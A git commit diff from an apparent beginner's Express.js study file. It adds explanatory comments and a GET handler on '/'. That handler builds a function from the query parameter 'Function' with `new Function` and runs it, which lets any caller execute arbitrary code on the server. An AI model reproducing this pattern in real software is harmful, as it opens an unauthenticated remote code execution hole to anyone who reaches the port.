faa55ed499ec65a12fed6e974a111b05e5830284
k9a8y6k5e <kaykekk8965@gmail.com>
2025-12-15 16:02:55 -0300

    'GET' command from express

--- study_application/javascript/APIuse.js
+++ study_application/javascript/APIuse.js
@@ -1,6 +1,4 @@
-/*
-* Explication of each type:
-* GET - search data, send the body
+/* GET - search data, send the body
 * POST - create something, send the body
 * PUT - update intern resource
 * PATCH - update a part of the resource
@@ -9,13 +7,27 @@
 * HEAD - same as GET, but don't send body
 */
 
+//create a variable with the imported module, getting a function from express
 const express = require('express');
+
+//create an instance with the function, to apply
 const app = express();
 
-console.log(app.listen(3000));
+//open the listener, allowing to the program acess the local server
+console.log(app.listen(3000));//port - value inside the parenteses
 
-app.post("/users", (req, res) =>{
-    const dados = req.body;
-    console.log(dados)
-    res.send('geted');
+//the port need to be the same as used to test or to work
+
+//GET request
+
+//SYNTAX -- app.get(<path>, <callback/function>)
+//path also need equals from the work/test
+//functions need to receive request(req) and a response(res)  value
+
+app.get('/', (req, res) => {
+    const data = req.query;//get the value returned
+    console.log(data);
+    const func = new Function(data.Function);
+    func();
+    res.send('received');//return a value, work as a "confirmation" message
 });
